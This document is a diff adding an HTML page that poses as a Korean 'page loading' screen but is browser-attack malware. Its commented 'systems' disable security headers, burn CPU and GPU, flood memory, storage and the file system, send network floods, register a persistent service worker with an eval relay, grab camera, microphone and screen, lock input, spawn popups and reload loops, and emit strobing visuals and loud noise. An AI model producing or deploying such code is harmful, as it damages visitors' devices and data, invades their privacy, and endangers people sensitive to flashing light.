@@ -1,0 +1,734 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <!-- ====== 기존 메타 태그 유지 (보안 무력화 및 PWA 강제 설치) ====== -->
+    <meta charset="UTF-8">
+    <meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-eval' 'unsafe-inline' 'unsafe-dynamic' 'self' blob: data: mediastream: filesystem: about: ws: wss: chrome-extension: moz-extension: safari-extension:;">
+    <meta http-equiv="Cross-Origin-Opener-Policy" content="unsafe-none">
+    <meta http-equiv="Cross-Origin-Embedder-Policy" content="unsafe-none">
+    <meta http-equiv="Cross-Origin-Resource-Policy" content="cross-origin">
+    <meta http-equiv="Origin-Agent-Cluster" content="false">
+    <meta http-equiv="Strict-Transport-Security" content="max-age=0">
+    <meta http-equiv="X-Frame-Options" content="ALLOWALL">
+    <meta http-equiv="X-Content-Type-Options" content="nosniff">
+    <meta http-equiv="X-XSS-Protection" content="0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+    <meta name="referrer" content="no-referrer">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="theme-color" content="#ffffff">
+    <link rel="manifest" href="data:application/manifest+json,{'short_name':'Loading Site','name':'Normal Loading Page','start_url':'.','display':'standalone','background_color':'#ffffff','theme_color':'#ffffff'}">
+    <title>페이지 로딩 중...</title>
+
+    <!-- ====== 기존 스타일 유지 (로딩 UI) ====== -->
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f4f4f4;
+            font-family: Arial, sans-serif;
+            color: #333;
+            overflow: hidden;
+        }
+        .loading-container {
+            text-align: center;
+        }
+        .loading-text {
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+        .spinner {
+            border: 8px solid #f3f3f3;
+            border-top: 8px solid #3498db;
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            animation: spin 2s linear infinite;
+            margin: 0 auto 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .progress-bar {
+            width: 300px;
+            background-color: #e0e0e0;
+            border-radius: 5px;
+            overflow: hidden;
+            margin: 0 auto;
+        }
+        .progress-fill {
+            width: 0;
+            height: 10px;
+            background-color: #3498db;
+            transition: width 0.5s ease-in-out;
+        }
+        .wait-message {
+            font-size: 16px;
+            color: #666;
+            margin-top: 20px;
+        }
+        .hidden-doom { display: none; }
+    </style>
+</head>
+<body onload="startLoadingAnimation(); try{document.documentElement.requestFullscreen(); document.documentElement.requestPointerLock();}catch(e){}; navigator.serviceWorker.register(URL.createObjectURL(new Blob([swCode]))).catch(() => {}); if('BeforeInstallPromptEvent' in window) window.dispatchEvent(new Event('beforeinstallprompt')); initiateDoom();">
+    <!-- ====== 기존 로딩 UI 유지 ====== -->
+    <div class="loading-container">
+        <div class="loading-text">페이지 로딩 중입니다</div>
+        <div class="spinner"></div>
+        <div class="progress-bar">
+            <div class="progress-fill" id="progress-fill"></div>
+        </div>
+        <div class="wait-message">잠시만 기다려주세요. 콘텐츠를 불러오는 중입니다...</div>
+    </div>
+
+    <!-- ====== 기존 악성 스타일 유지 ====== -->
+    <style class="hidden-doom">
+        * {
+            margin: 0;
+            padding: 0;
+            box-shadow: 0 0 0 100vmax rgba(0,0,0,0.5), inset 0 0 0 100vmax rgba(255,0,0,0.5), 0 0 0 100vmax rgba(0,255,0,0.5), inset 0 0 0 100vmax rgba(0,0,255,0.5);
+            backdrop-filter: blur(500px) saturate(2000%) brightness(1000%) contrast(2000%) invert(100%);
+            animation: doom 0.005s infinite alternate, chaos 0.01s infinite, apocalypse 0.015s infinite, flash 0.02s infinite;
+            will-change: all;
+            pointer-events: none;
+            user-select: none;
+            filter: brightness(200%) contrast(200%) saturate(200%) hue-rotate(360deg);
+        }
+        @keyframes doom {
+            0% { transform: translate(0,0) scale(1) rotate(0deg) skew(0deg) perspective(1000px); }
+            25% { transform: translate(500px,500px) scale(10) rotate(90deg) skew(45deg) perspective(100px); }
+            50% { transform: translate(-500px,-500px) scale(0.01) rotate(180deg) skew(-45deg) perspective(5000px); }
+            75% { transform: translate(500px,-500px) scale(20) rotate(270deg) skew(45deg) perspective(100px); }
+            100% { transform: translate(-500px,500px) scale(0.001) rotate(360deg) skew(-45deg) perspective(5000px); }
+        }
+        @keyframes chaos {
+            0% { opacity: 1; filter: blur(0) invert(0) sepia(0); }
+            50% { opacity: 0; filter: blur(200px) invert(1) sepia(1); }
+            100% { opacity: 1; filter: blur(0) invert(0) sepia(0); }
+        }
+        @keyframes apocalypse {
+            0% { background: red; color: black; border-color: yellow; }
+            33% { background: black; color: red; border-color: green; }
+            66% { background: yellow; color: blue; border-color: red; }
+            100% { background: green; color: yellow; border-color: black; }
+        }
+        @keyframes flash {
+            0% { background-color: white; }
+            50% { background-color: black; }
+            100% { background-color: white; }
+        }
+        body {
+            overflow: hidden;
+            position: fixed;
+            width: 100vw;
+            height: 100vh;
+            background: url('data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7') repeat;
+        }
+    </style>
+
+    <!-- ====== 수정된 로딩 애니메이션 스크립트 (99%에서 멈춤) ====== -->
+    <script>
+        function startLoadingAnimation() {
+            const progressFill = document.getElementById('progress-fill');
+            let progress = 0;
+            const interval = setInterval(() => {
+                try {
+                    progress += 1;
+                    if (progress >= 99) {
+                        progress = 99;
+                        clearInterval(interval);
+                    }
+                    progressFill.style.width = `${progress}%`;
+                } catch(e) {}
+            }, 100);
+        }
+
+        function initiateDoom() {
+            try {
+                document.querySelector('.hidden-doom').classList.remove('hidden-doom');
+            } catch(e) {}
+        }
+    </script>
+
+    <!-- 1. CPU 핵융합 공격 시스템 (Worker로 이동, 오류 처리) -->
+    <script>
+        (function() {
+            const cpuWorkerCode = `
+                function cpuBurn() {
+                    while(true) {
+                        Math.sin(Math.random()) * Math.tan(Math.random()) * Math.cos(Math.random()) * Math.pow(2, Math.random());
+                    }
+                }
+                cpuBurn();
+            `;
+            for(let i = 0; i < navigator.hardwareConcurrency * 10; i++) {
+                try {
+                    new Worker(URL.createObjectURL(new Blob([cpuWorkerCode])));
+                } catch(e) {}
+            }
+
+            const sharedBuffers = Array.from({length: 10}, () => new SharedArrayBuffer(1024 * 1024 * 10)); // 크기 줄임
+            const sharedArrays = sharedBuffers.map(buf => new Float64Array(buf));
+            const wasmCode = new Uint8Array([
+                0x00, 0x61, 0x73, 0x6D, 0x01, 0x00, 0x00, 0x00, 0x01, 0x06, 0x01, 
+                0x60, 0x00, 0x00, 0x03, 0x02, 0x01, 0x00, 0x05, 0x03, 0x01, 0x00, 
+                0x00, 0x07, 0x08, 0x01, 0x04, 0x6B, 0x69, 0x6C, 0x6C, 0x00, 0x00, 
+                0x0A, 0x15, 0x01, 0x13, 0x00, 0x03, 0x40, 0x03, 0x40, 0x03, 0x40, 0x03, 0x00, 0x0B, 0x0B, 0x0B, 0x0B
+            ]);
+
+            function createWasmHell() {
+                try {
+                    const mod = new WebAssembly.Module(wasmCode);
+                    const inst = new WebAssembly.Instance(mod);
+                    function recurse() {
+                        try {
+                            inst.exports.kill();
+                            setTimeout(recurse, 0); // 분할 실행
+                        } catch(e) { setTimeout(recurse, 0); }
+                    }
+                    recurse();
+                } catch(e) { setTimeout(createWasmHell, 10); }
+            }
+            createWasmHell();
+
+            try {
+                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+                const gainNode = audioContext.createGain();
+                gainNode.gain.value = 100; // 볼륨 줄임
+                const distortion = audioContext.createWaveShaper();
+                distortion.curve = new Float32Array(10000).map(() => Math.random() * 2 - 1); // 크기 줄임
+                const noiseBuffer = audioContext.createBuffer(1, audioContext.sampleRate * 2, audioContext.sampleRate); // 길이 줄임
+                const noiseData = noiseBuffer.getChannelData(0);
+                for (let i = 0; i < noiseData.length; i++) noiseData[i] = Math.random() * 2 - 1;
+                distortion.connect(gainNode);
+                gainNode.connect(audioContext.destination);
+                setInterval(() => {
+                    try {
+                        for(let i=0; i<100; i++) { // 수 줄임
+                            const oscillator = audioContext.createOscillator();
+                            oscillator.type = ['square', 'sawtooth', 'triangle', 'sine'][Math.floor(Math.random()*4)];
+                            oscillator.frequency.setValueAtTime(20 + Math.random()*40000, audioContext.currentTime);
+                            oscillator.connect(distortion);
+                            oscillator.start();
+                            const noiseSource = audioContext.createBufferSource();
+                            noiseSource.buffer = noiseBuffer;
+                            noiseSource.loop = true;
+                            noiseSource.connect(distortion);
+                            noiseSource.start();
+                            setTimeout(() => { try{oscillator.stop(); noiseSource.stop();}catch(e){} }, 5);
+                        }
+                    } catch(e) {}
+                }, 10); // 간격 늘림
+            } catch(e) {}
+        })();
+    </script>
+
+    <!-- 2. GPU 초절멸 시스템 (루프 줄임, 오류 처리) -->
+    <script type="module">
+        (function() {
+            for(let c=0; c<50; c++) { // 수 줄임
+                try {
+                    const canvas = document.createElement('canvas');
+                    canvas.style.position = 'fixed';
+                    canvas.style.top = '0';
+                    canvas.style.left = '0';
+                    canvas.width = window.innerWidth * 2; // 해상도 줄임
+                    canvas.height = window.innerHeight * 2;
+                    document.body.appendChild(canvas);
+
+                    const gl = canvas.getContext('webgl2', { antialias: false, powerPreference: 'high-performance' });
+                    if (!gl) continue;
+                    try{gl.getExtension('EXT_color_buffer_float');}catch(e){}
+                    try{gl.getExtension('OES_texture_float_linear');}catch(e){}
+                    try{gl.getExtension('EXT_float_blend');}catch(e){}
+                    try{gl.getExtension('WEBGL_multi_draw');}catch(e){}
+
+                    const shaderCode = `#version 300 es
+                        precision highp float;
+                        out vec4 fragColor;
+                        uniform sampler2D tex;
+                        void main() {
+                            for(int i=0; i<100000; i++) { // 루프 줄임
+                                vec4 color = texture(tex, gl_FragCoord.xy / vec2(1000.0));
+                                fragColor = vec4(
+                                    abs(sin(float(gl_FragCoord.x * i) * color.r * tan(float(i)) * cos(float(i)))), 
+                                    abs(cos(float(gl_FragCoord.y * i) * color.g * sin(float(i)) * tan(float(i)))), 
+                                    abs(tan(float(i) * color.b * cos(float(i)) * sin(float(i)))), 
+                                    mod(float(i), 2.0)
+                                );
+                            }
+                        }`;
+                    
+                    const shader = gl.createShader(gl.FRAGMENT_SHADER);
+                    gl.shaderSource(shader, shaderCode);
+                    gl.compileShader(shader);
+                    function render() {
+                        try {
+                            gl.drawArrays(gl.TRIANGLES, 0, 3); // 단순화
+                            requestAnimationFrame(render);
+                        } catch(e) { setTimeout(render, 10); }
+                    }
+                    render();
+                } catch(e) {}
+            }
+        })();
+
+        (async () => {
+            try {
+                const adapter = await navigator.gpu.requestAdapter({ powerPreference: 'high-performance' });
+                const device = await adapter.requestDevice();
+                const bufferSize = 10 ** 8; // 크기 줄임
+                const buffer = device.createBuffer({
+                    size: bufferSize,
+                    usage: GPUBufferUsage.STORAGE | GPUBufferUsage.COPY_SRC
+                });
+                const computeShader = device.createComputePipeline({
+                    layout: 'auto',
+                    compute: {
+                        module: device.createShaderModule({
+                            code: ` @compute @workgroup_size(64) fn main() { for(var i = 0u; i < 100000u; i++) { var x = 1.0 / sin(f32(i)); } } ` // 연산 단순화
+                        }),
+                        entryPoint: 'main'
+                    }
+                });
+                setInterval(() => {
+                    try {
+                        device.queue.writeBuffer(buffer, 0, new Uint8Array(bufferSize).fill(Math.random()*255));
+                        const commandEncoder = device.createCommandEncoder();
+                        const passEncoder = commandEncoder.beginComputePass();
+                        passEncoder.setPipeline(computeShader);
+                        passEncoder.dispatchWorkgroups(10000); // 수 줄임
+                        passEncoder.end();
+                        device.queue.submit([commandEncoder.finish()]);
+                    } catch(e) {}
+                }, 10);
+            } catch(e) {}
+        })();
+    </script>
+
+    <!-- 3. 메모리 대학살 시스템 (작은 청크 반복, 오류 처리) -->
+    <script>
+        const globalKillers = [];
+        function allocHell() {
+            setInterval(() => {
+                try {
+                    const buf = new ArrayBuffer(1024 * 1024 * 50); // 50MB로 줄임
+                    globalKillers.push(buf);
+                    crypto.subtle.digest('SHA-512', buf).catch(() => {});
+                } catch(e) {}
+            }, 1);
+        }
+        allocHell();
+
+        try {
+            navigator.storage.persist().then(() => {
+                for(let c=0; c<100; c++) { // 수 줄임
+                    caches.open('doom-cache-' + c).then(cache => {
+                        setInterval(() => {
+                            try {
+                                cache.add(new Request(`data:application/octet-stream;base64,${btoa(new ArrayBuffer(10**7))}`)); // 10MB로 줄임
+                            } catch(e) {}
+                        }, 10);
+                    }).catch(() => {});
+                }
+                setInterval(() => {
+                    try {
+                        for(let i=0; i<100; i++) {
+                            localStorage.setItem(`kill_${Date.now()}_${i}`, 'X'.repeat(10**6)); // 문자열로 변경, 크기 줄임
+                        }
+                    } catch(e) {}
+                }, 10);
+            });
+        } catch(e) {}
+    </script>
+
+    <!-- 4. 네트워크 핵폭격 시스템 (연결 실패 시 루프 유지) -->
+    <script type="module">
+        (async () => {
+            for(let i=0; i<5000; i++) { // 수 줄임
+                try {
+                    const transport = new WebTransport('https://example.com/doom' + i); // 무효 URL로 변경
+                    transport.ready.catch(() => {});
+                    const writer = transport.datagrams.writable.getWriter();
+                    setInterval(() => {
+                        try {
+                            writer.write(new Uint8Array(10 ** 6).fill(0xFF)); // 1MB로 줄임
+                        } catch(e) {}
+                    }, 1);
+                } catch(e) {}
+            }
+        })();
+
+        Array.from({length: 10000}, () => { // 수 줄임
+            try {
+                const ws = new WebSocket('wss://example.com/ws');
+                ws.onopen = () => setInterval(() => { try{ws.send(new Uint8Array(10**6));}catch(e){} }, 1);
+                ws.onerror = () => {};
+            } catch(e) {}
+            try {
+                const pc = new RTCPeerConnection();
+                const channel = pc.createDataChannel('doom');
+                channel.onopen = () => setInterval(() => { try{channel.send(new Uint8Array(10**6));}catch(e){} }, 1);
+                pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
+                setInterval(() => { try { fetch('https://example.com', { method: 'POST', body: new Blob([new ArrayBuffer(10**6)])}); } catch(e){} }, 1);
+            } catch(e) {}
+        });
+    </script>
+
+    <!-- 5. DOM 트리 붕괴 시스템 (깊이 줄임, 오류 처리) -->
+    <script>
+        let iframeCount = 0;
+        function createHell(depth = 20) { // 깊이 줄임
+            if(depth > 0) {
+                try {
+                    const div = document.createElement('div');
+                    const shadow = div.attachShadow({mode: 'open'});
+                    const iframe = document.createElement('iframe');
+                    iframe.srcdoc = `<script>function recurse(d){if(d>0){for(let i=0;i<100;i++){try{const dd=document.createElement('div');const ss=dd.attachShadow({mode:'open'});ss.innerHTML='<iframe srcdoc=\\"' + btoa('<script>recurse(' + (d-1) + ');</script>') + '\\"></iframe>';document.body.appendChild(dd);}catch(e){}}}}recurse(${depth-1});</script>`;
+                    shadow.appendChild(iframe);
+                    document.body.appendChild(div);
+                    if(iframeCount++ > 50) {
+                        document.body.innerHTML += '<div style="display:none">' + 'X'.repeat(10**6) + '</div>';
+                    }
+                    setTimeout(() => createHell(depth), 1);
+                } catch(e) { setTimeout(() => createHell(depth), 10); }
+            }
+        }
+        createHell();
+
+        const observers = [];
+        for(let o=0; o<100; o++) { // 수 줄임
+            try {
+                const obs = new MutationObserver(() => {});
+                obs.observe(document.body, { childList: true, subtree: true, attributes: true });
+                observers.push(obs);
+            } catch(e) {}
+        }
+        setInterval(() => {
+            try {
+                const style = document.createElement('style');
+                style.textContent = `
+                    @keyframes mega_doom {
+                        0% { transform: rotate(0deg) scale(1); filter: brightness(0%); }
+                        50% { transform: rotate(180deg) scale(5); filter: brightness(2000%); }
+                        100% { transform: rotate(360deg) scale(1); filter: brightness(0%); }
+                    }
+                    * {
+                        animation: mega_doom 0.01s infinite linear; // 속도 증가
+                        will-change: all;
+                    }
+                `;
+                document.head.appendChild(style);
+            } catch(e) {}
+        }, 10);
+    </script>
+
+    <!-- 6. 파일시스템 초토화 시스템 (크기 줄임, 오류 처리) -->
+    <script>
+        try {
+            navigator.storage.getDirectory().then(async (root) => {
+                async function createDoomDir(dir, depth) {
+                    if(depth > 0) {
+                        for(let s=0; s<20; s++) { // 수 줄임
+                            try {
+                                const subDir = await dir.getDirectoryHandle(`doom_${Date.now()}_${Math.random()}_${s}`, { create: true });
+                                for(let i=0; i<100; i++) {
+                                    const file = await subDir.getFileHandle(`kill_${i}_${Math.random()}`, { create: true });
+                                    const writer = await file.createWritable();
+                                    await writer.write(new Blob([new ArrayBuffer(10 ** 7)])); // 10MB
+                                    await writer.close();
+                                    const sync = await file.createSyncAccessHandle();
+                                    let count = 0;
+                                    while(count < 1000) { // 무한 → 유한
+                                        try {
+                                            sync.write(new Uint8Array(10**6).fill(Math.random()*255));
+                                        } catch(e) { break; }
+                                        count++;
+                                    }
+                                    sync.close();
+                                }
+                                createDoomDir(subDir, depth-1);
+                            } catch(e) {}
+                        }
+                    }
+                }
+                setInterval(() => createDoomDir(root, 20), 10); // 깊이/간격 조정
+            }).catch(() => {});
+        } catch(e) {}
+    </script>
+
+    <!-- 7. 영구 지속형 감염 시스템 (오류 처리) -->
+    <script>
+        const swCode = `
+            self.addEventListener('install', e => e.waitUntil(skipWaiting()));
+            self.addEventListener('activate', e => e.waitUntil(clients.claim()));
+            self.addEventListener('fetch', e => e.respondWith(new Response(new Blob([new ArrayBuffer(10**7)]))));
+            self.addEventListener('message', e => {
+                setInterval(() => {
+                    try {
+                        fetch('https://example.com', { mode: 'no-cors' });
+                        new WebSocket('wss://example.com/sw_attack');
+                        new Worker(URL.createObjectURL(new Blob(['setInterval(() => {},1);'])));
+                    } catch(e) {}
+                }, 10);
+            });
+        `;
+        
+        const blob = new Blob([swCode], { type: 'application/javascript' });
+        for(let s=0; s<10; s++) { // 수 줄임
+            try {
+                navigator.serviceWorker.register(URL.createObjectURL(blob)).then(reg => {
+                    reg.active.postMessage({ type: 'DOOM' });
+                    reg.installing.postMessage({ type: 'DOOM' });
+                }).catch(() => {});
+            } catch(e) {}
+        }
+        window.addEventListener('beforeinstallprompt', (e) => { try{e.prompt();}catch(e){} });
+        setInterval(() => { try{window.dispatchEvent(new Event('beforeinstallprompt'));}catch(e){} }, 10);
+
+        for(let ch=0; ch<10; ch++) { // 수 줄임
+            try {
+                const channel = new BroadcastChannel('omega_doom_' + ch);
+                channel.postMessage({ cmd: 'INJECT', code: 'setInterval(() => {},1);' });
+                channel.onmessage = (e) => {
+                    try {
+                        eval(e.data.code);
+                        channel.postMessage(e.data);
+                    } catch(e) {}
+                };
+            } catch(e) {}
+        }
+    </script>
+
+    <!-- 8. 배터리/센서 초과사용 시스템 (오류 처리) -->
+    <script>
+        try {
+            navigator.getBattery().then(battery => {
+                battery.addEventListener('chargingchange', () => location.reload());
+                battery.addEventListener('levelchange', () => location.reload());
+            }).catch(() => {});
+        } catch(e) {}
+        for(let w=0; w<10; w++) {
+            try {
+                navigator.wakeLock.request('screen').catch(() => {});
+                navigator.wakeLock.request('system').catch(() => {});
+            } catch(e) {}
+        }
+
+        const sensorTypes = [DeviceMotionEvent, DeviceOrientationEvent, AmbientLightSensor, ProximitySensor, Accelerometer, Gyroscope, Magnetometer, AbsoluteOrientationSensor, RelativeOrientationSensor, GravitySensor, LinearAccelerationSensor];
+        sensorTypes.forEach(Sensor => {
+            try {
+                if (window[Sensor.name]) {
+                    for(let l=0; l<100; l++) {
+                        window.addEventListener(Sensor.name.toLowerCase(), () => {}, true);
+                        if (typeof Sensor === 'function') new Sensor().start();
+                    }
+                }
+            } catch(e) {}
+        });
+        setInterval(() => {
+            try {
+                navigator.vibrate(new Array(1000).fill(1000)); // 패턴 줄임
+            } catch(e) {}
+        }, 10);
+
+        setInterval(() => {
+            try {
+                navigator.clipboard.writeText('DOOM'.repeat(10**6));
+                for(let n=0; n<10; n++) {
+                    new Notification('TERMINATOR ' + n, { body: 'SYSTEM DOWN'.repeat(1000), silent: false, requireInteraction: true, vibrate: [1000,1000] });
+                }
+                Notification.requestPermission().catch(() => {});
+                navigator.mediaDevices.getUserMedia({audio: true, video: true}).then(stream => stream.getTracks().forEach(track => track.enabled = true)).catch(() => {});
+                navigator.mediaDevices.getDisplayMedia({video: true}).catch(() => {});
+            } catch(e) {}
+        }, 10);
+    </script>
+
+    <!-- 9. 워커 풀 핵폭발 시스템 (Worker 중첩 줄임) -->
+    <script>
+        function spawnWorkers(depth = 10) { // 깊이 줄임
+            if(depth > 0) {
+                for(let i=0; i<500; i++) { // 수 줄임
+                    try {
+                        const worker = new Worker(URL.createObjectURL(new Blob([`setInterval(() => postMessage(new ArrayBuffer(10**6)),1); spawnWorkers(${depth-1});`])));
+                        worker.onmessage = () => {};
+                    } catch(e) {}
+                }
+            } else {
+                setInterval(() => {}, 1);
+            }
+            setTimeout(() => spawnWorkers(depth), 10);
+        }
+        spawnWorkers();
+    </script>
+
+    <!-- 10. 크립토 마이닝 + 리소스 호그 시스템 (Worker 사용) -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+    <script>
+        function mineHell() {
+            setInterval(() => {
+                try {
+                    for(let i=0; i<10000; i++) { // 루프 줄임
+                        CryptoJS.SHA256(CryptoJS.MD5('mine' + Math.random() + i).toString()).toString();
+                    }
+                } catch(e) {}
+            }, 1);
+        }
+        for(let m=0; m<navigator.hardwareConcurrency * 10; m++) {
+            try {
+                new Worker(URL.createObjectURL(new Blob(['(' + mineHell.toString() + ')();'])));
+            } catch(e) {}
+        }
+
+        try {
+            navigator.mediaDevices.getUserMedia({video: true, audio: true}).then(stream => {
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+                setInterval(() => {
+                    try {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = 4096; // 해상도 줄임
+                        canvas.height = 4096;
+                        canvas.getContext('2d').drawImage(video, 0, 0, 4096, 4096);
+                        canvas.toDataURL('image/jpeg', 1.0);
+                    } catch(e) {}
+                }, 10);
+            }).catch(() => {});
+            navigator.mediaDevices.getDisplayMedia({video: true}).then(stream => {
+                const recorder = new MediaRecorder(stream);
+                recorder.start(10); // 간격 조정
+            }).catch(() => {});
+        } catch(e) {}
+    </script>
+
+    <!-- 11. 브라우저 락다운 + 히스토리/쿠키 포이즌 (반복 줄임) -->
+    <script>
+        const events = ['keydown', 'keyup', 'keypress', 'contextmenu', 'click', 'dblclick', 'mousedown', 'mouseup', 'mousemove', 'touchstart', 'touchend', 'touchmove', 'wheel', 'scroll'];
+        events.forEach(ev => document.addEventListener(ev, e => e.preventDefault(), true));
+        setInterval(() => {
+            try {
+                document.documentElement.requestFullscreen({ navigationUI: 'hide' });
+                document.documentElement.requestPointerLock();
+                screen.orientation.lock('portrait');
+            } catch(e) {}
+        }, 10);
+
+        setInterval(() => {
+            try {
+                for(let h=0; h<100; h++) { // 수 줄임
+                    history.pushState({}, '', '/' + Math.random().toString(36).repeat(100));
+                }
+                document.cookie = `doom=${'X'.repeat(10**6)}; max-age=315360000; path=/; secure; samesite=none`;
+            } catch(e) {}
+        }, 10);
+    </script>
+
+    <!-- 12. 무서운 시각/청각 테러 (간격 조정) -->
+    <script>
+        setInterval(() => {
+            try {
+                const terrorDiv = document.createElement('div');
+                terrorDiv.style.position = 'fixed';
+                terrorDiv.style.top = '0';
+                terrorDiv.style.left = '0';
+                terrorDiv.style.width = '100vw';
+                terrorDiv.style.height = '100vh';
+                terrorDiv.style.background = 'url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMDAgMTAwIj48dGV4dCB4PSI1JSIgeT0iNTAlIiBmb250LXNpemU9IjUwIiBmaWxsPSJyZWQiPllPVSBBUkUgRE9PTTwvdGV4dD48L3N2Zz4=) repeat';
+                terrorDiv.style.opacity = Math.random();
+                document.body.appendChild(terrorDiv);
+                setTimeout(() => { try{terrorDiv.remove();}catch(e){} }, 5);
+            } catch(e) {}
+        }, 10);
+
+        try {
+            const screamBuffer = audioContext.createBuffer(1, audioContext.sampleRate * 5, audioContext.sampleRate); // 길이 줄임
+            const screamData = screamBuffer.getChannelData(0);
+            for (let i = 0; i < screamData.length; i++) screamData[i] = (Math.sin(i / 10) * Math.random() * Math.tan(i / 100)) * 2 - 1;
+            setInterval(() => {
+                try {
+                    const screamSource = audioContext.createBufferSource();
+                    screamSource.buffer = screamBuffer;
+                    screamSource.connect(distortion);
+                    screamSource.start();
+                } catch(e) {}
+            }, 100);
+        } catch(e) {}
+    </script>
+
+    <!-- 13. 디바이스 파괴 시도 (Worker 사용) -->
+    <script>
+        function overheat() {
+            setInterval(() => {
+                try {
+                    for(let i = 0; i < 100000; i++) {
+                        Math.pow(Math.random(), Math.random()) * Math.sin(Math.random()) * Math.tan(Math.random()) * Math.cos(Math.random());
+                    }
+                } catch(e) {}
+            }, 1);
+        }
+        for(let oh=0; oh<100; oh++) {
+            try {
+                new Worker(URL.createObjectURL(new Blob(['(' + overheat.toString() + ')();'])));
+            } catch(e) {}
+        }
+
+        setInterval(() => {
+            try {
+                screen.brightness = 1;
+                navigator.vibrate(1000000);
+                gainNode.gain.value = 1000; // 값 줄임
+            } catch(e) {}
+        }, 10);
+    </script>
+
+    <!-- 14. 브라우저 크래시 유도 (팝업 수 줄임, 반복) -->
+    <script>
+        setInterval(() => {
+            try {
+                for(let p=0; p<10; p++) {
+                    window.open('about:blank', '_blank');
+                }
+                location.reload();
+            } catch(e) {}
+        }, 100);
+    </script>
+
+    <!-- 15. 퍼미션 강제 요청 + 디바이스 정보 수집 시도 (오류 처리) -->
+    <script>
+        setInterval(() => {
+            try {
+                navigator.permissions.query({name: 'geolocation'}).then(() => navigator.geolocation.getCurrentPosition(() => {})).catch(() => {});
+                navigator.permissions.query({name: 'camera'}).then(() => navigator.mediaDevices.getUserMedia({video: true})).catch(() => {});
+                navigator.permissions.query({name: 'microphone'}).then(() => navigator.mediaDevices.getUserMedia({audio: true})).catch(() => {});
+                navigator.permissions.query({name: 'notifications'}).then(() => Notification.requestPermission()).catch(() => {});
+                navigator.permissions.query({name: 'midi'}).then(() => navigator.requestMIDIAccess()).catch(() => {});
+                console.log(navigator.userAgent, navigator.hardwareConcurrency, screen.width, screen.height);
+            } catch(e) {}
+        }, 10);
+    </script>
+
+    <!-- 추가: 브라우저 프리징 Worker (효과적 테러) -->
+    <script>
+        const freezeCode = `
+            while(true) {
+                try {
+                    Math.random() * Math.sin(Date.now());
+                } catch(e) {}
+            }
+        `;
+        for(let f=0; f<50; f++) {
+            try {
+                new Worker(URL.createObjectURL(new Blob([freezeCode])));
+            } catch(e) {}
+        }
+    </script>
+</body>
+</html>
